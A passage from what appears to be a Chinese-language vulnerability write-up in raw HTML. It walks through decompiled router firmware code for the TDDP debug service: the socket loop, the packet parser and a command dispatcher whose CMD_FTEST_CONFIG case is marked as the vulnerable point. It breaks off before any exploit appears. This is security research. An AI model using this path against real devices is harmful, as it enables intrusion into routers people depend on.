 _DWORD *v6; <span class="comment">// [sp+9Ch] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+A0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> nfds; <span class="comment">// [sp+A4h] [bp-18h]</span></span><br><span class="line">  fd_set *p_readfds; <span class="comment">// [sp+A8h] [bp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+ACh] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task start\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">151</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">sub_16ACC</span>(&amp;v6)</span><br><span class="line">    &amp;&amp; !<span class="built_in">sub_16E5C</span>(v6 + <span class="number">9</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">setsockopt</span>(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">sub_16D68</span>(v6[<span class="number">9</span>], <span class="number">1040</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">setsockopt</span>(v6[<span class="number">9</span>], <span class="number">1</span>, <span class="number">6</span>, &amp;v3, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">2u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">4u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">8u</span>;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x10</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x20</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x1000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x2000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x4000</span>u;</span><br><span class="line">    v6[<span class="number">11</span>] |= <span class="number">0x8000</span>u;</span><br><span class="line">    v6[<span class="number">12</span>] = <span class="number">60</span>;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[<span class="number">13</span>] = <span class="built_in">sub_9340</span>();</span><br><span class="line">    p_readfds = &amp;readfds;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">      p_readfds-&gt;__fds_bits[i] = <span class="number">0</span>;</span><br><span class="line">    nfds = v6[<span class="number">9</span>] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = <span class="number">600</span>;</span><br><span class="line">        timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">        readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">        v7 = <span class="built_in">select</span>(nfds, &amp;readfds, <span class="number">0</span>, <span class="number">0</span>, &amp;timeout);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_9340</span>() - v6[<span class="number">13</span>] &gt; v6[<span class="number">12</span>] )</span><br><span class="line">          v6[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 == <span class="number">-1</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] &gt;&gt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">sub_16418</span>(v6); <span class="comment">//这里对数据包进行解包</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_16E0C</span>(v6[<span class="number">9</span>]);</span><br><span class="line">  <span class="built_in">sub_16C18</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] tddp task exit\n&quot;</span>, <span class="string">&quot;tddp_taskEntry&quot;</span>, <span class="number">219</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看解包函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_16418</span><span class="params">(<span class="type">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r3</span></span><br><span class="line">  __int16 v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// r3</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+10h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">socklen_t</span> addr_len; <span class="comment">// [sp+14h] [bp-28h] BYREF</span></span><br><span class="line">  sockaddr addr; <span class="comment">// [sp+18h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v14; <span class="comment">// [sp+28h] [bp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// [sp+2Ch] [bp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v16; <span class="comment">// [sp+30h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+34h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  addr_len = <span class="number">16</span>;</span><br><span class="line">  n = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">char</span> *)a1 + <span class="number">82</span>, <span class="number">0</span>, <span class="number">0xAFC9</span>u);</span><br><span class="line">  v16 = (<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45083</span>;</span><br><span class="line">  v15 = (<span class="type">char</span> *)a1 + <span class="number">82</span>;</span><br><span class="line">  v14 = <span class="built_in">recvfrom</span>(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">45083</span>, <span class="number">0xAFC8</span>u, <span class="number">0</span>, &amp;addr, &amp;addr_len);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_13018</span>(<span class="number">-10106</span>, <span class="string">&quot;receive error&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_15458</span>(a1);</span><br><span class="line">  a1[<span class="number">11</span>] |= <span class="number">1u</span>;</span><br><span class="line">  v2 = *v16;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1</span> ) <span class="comment">//判断是否为v1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sub_15AD8</span>(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = <span class="built_in">sub_9340</span>();</span><br><span class="line">      v17 = <span class="built_in">sub_15E74</span>(a1, &amp;n); <span class="comment">//下一步操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *v15 = <span class="number">1</span>;</span><br><span class="line">      v15[<span class="number">1</span>] = v16[<span class="number">1</span>];</span><br><span class="line">      v15[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">      v15[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">      *((_DWORD *)v15 + <span class="number">1</span>) = <span class="built_in">htonl</span>(<span class="number">0</span>);</span><br><span class="line">      v5 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v6 = v15;</span><br><span class="line">      v15[<span class="number">8</span>] = v16[<span class="number">8</span>];</span><br><span class="line">      v6[<span class="number">9</span>] = <span class="built_in">HIBYTE</span>(v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sub_15AD8</span>(a1, &amp;addr) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">13</span>] = <span class="built_in">sub_9340</span>();</span><br><span class="line">      v17 = <span class="built_in">sub_15BB8</span>(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">-10301</span>;</span><br><span class="line">      *v15 = <span class="number">2</span>;</span><br><span class="line">      v15[<span class="number">1</span>] = v16[<span class="number">1</span>];</span><br><span class="line">      v15[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">      v15[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">      *((_DWORD *)v15 + <span class="number">1</span>) = <span class="built_in">htonl</span>(<span class="number">0</span>);</span><br><span class="line">      v3 = (v16[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | v16[<span class="number">8</span>];</span><br><span class="line">      v4 = v15;</span><br><span class="line">      v15[<span class="number">8</span>] = v16[<span class="number">8</span>];</span><br><span class="line">      v4[<span class="number">9</span>] = <span class="built_in">HIBYTE</span>(v3);</span><br><span class="line">      <span class="built_in">sub_15830</span>(a1, &amp;n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15[<span class="number">3</span>] = <span class="number">7</span>;</span><br><span class="line">    v7 = v15;</span><br><span class="line">    v15[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    v7[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    n = (((<span class="type">unsigned</span> __int8)v15[<span class="number">7</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int8)v15[<span class="number">6</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int8)v15[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v15[<span class="number">4</span>])</span><br><span class="line">      + <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    v8 = a1[<span class="number">11</span>] &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &amp;&amp; <span class="built_in">sendto</span>(a1[<span class="number">9</span>], (<span class="type">char</span> *)a1 + <span class="number">82</span>, n, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_13018</span>(<span class="number">-10105</span>, <span class="string">&quot;tddp_parserHandler sendto error&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进下一步操作：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_15E74</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  __int16 v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+Ch] [bp-18h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [sp+10h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v7 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">82</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( *(_BYTE *)(a1 + <span class="number">45084</span>) ) <span class="comment">//第二个字节</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_AUTO_TEST\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">697</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_AC78</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_CONFIG_MAC\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">638</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_9944</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_CANCEL_TEST\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">648</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_ADDC</span>(a1);</span><br><span class="line">      <span class="keyword">if</span> ( !a1</span><br><span class="line">        || (*(_DWORD *)(a1 + <span class="number">44</span>) &amp; <span class="number">4</span>) == <span class="number">0</span></span><br><span class="line">        || (*(_DWORD *)(a1 + <span class="number">44</span>) &amp; <span class="number">8</span>) == <span class="number">0</span></span><br><span class="line">        || (*(_DWORD *)(a1 + <span class="number">44</span>) &amp; <span class="number">0x10</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">44</span>) &amp;= ~<span class="number">2u</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">44</span>) &amp;= ~<span class="number">1u</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_REBOOT_FOR_TEST\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">702</span>);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">44</span>) &amp;= ~<span class="number">1u</span>;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_GET_PROD_ID\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">643</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_9C24</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_SYS_INIT\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">615</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a1 &amp;&amp; (*(_DWORD *)(a1 + <span class="number">44</span>) &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(v7 + <span class="number">1</span>) = <span class="number">4</span>;</span><br><span class="line">        *(_BYTE *)(v7 + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">        *(_BYTE *)(v7 + <span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_DWORD *)(v7 + <span class="number">4</span>) = <span class="built_in">htonl</span>(<span class="number">0</span>);</span><br><span class="line">        v2 = ((<span class="type">unsigned</span> __int8)v8[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v8[<span class="number">8</span>];</span><br><span class="line">        *(_BYTE *)(v7 + <span class="number">8</span>) = v8[<span class="number">8</span>];</span><br><span class="line">        *(_BYTE *)(v7 + <span class="number">9</span>) = <span class="built_in">HIBYTE</span>(v2);</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">44</span>) &amp;= ~<span class="number">1u</span>;</span><br><span class="line">        v9 = <span class="number">-10411</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_CONFIG_PIN\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">682</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_A97C</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_USB\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">687</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_A3C8</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x31</span>: <span class="comment">//漏洞点</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">      v9 = <span class="built_in">sub_A580</span>(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;[%s():%d] TDDPv1: receive unknown type: %d\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>,</span><br><span class="line">        <span class="number">713</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45084</span>));</span><br><span class="line">      *(_BYTE *)(v7 + <span class="number">1</span>) = v8[<span class="number">1</span>];</span><br><span class="line">      *(_BYTE *)(v7 + <span class="number">3</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v7 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">4</span>) = <span class="built_in">htonl</span>(<span class="number">0</span>);</span><br><span class="line">      v3 = ((<span class="type">unsigned</span> __int8)v8[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v8[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v7 + <span class="number">8</span>) = v8[<span class="number">8</span>];</span><br><span class="line">      *(_BYTE *)(v7 + <span class="number">9</span>) = <span class="built_in">HIBYTE</span>(v3);</span><br><span class="line">      v9 = <span class="number">-10302</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = <span class="built_in">ntohl</span>((*(<span class="type">unsigned</span> __int8 *)(v7 + <span class="number">7</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="type">unsigned</span> __int8 *)(v7 + <span class="number">6</span>) &lt;&lt; <span class="number">16</span>) | (*(<span class="type">unsigned</span> __int8 *)(v7 + <span class="number">5</span>) &lt;&lt; <span class="number">8</span>) | *(<span class="type">unsigned</span> __int8 *)(v7 + <span class="number">4</span>))</span><br><span class="line">      + <span class="number">12</span>;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看漏洞函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_A580</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  __int64 v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">64</span>]; <span class="comment">// [sp+8h] [bp-E4h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">64</span>]; <span class="comment">// [sp+48h] [bp-A4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+88h] [bp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+C8h] [bp-24h]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [sp+CCh] [bp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+D0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+D4h] [bp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [sp+D8h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+DCh] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+E0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [sp+E4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = <span class="number">1</span>;</span><br><span class="line">  v17 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="built_in">sizeof</span>(v10));</span><br><span class="line">  v1 = <span 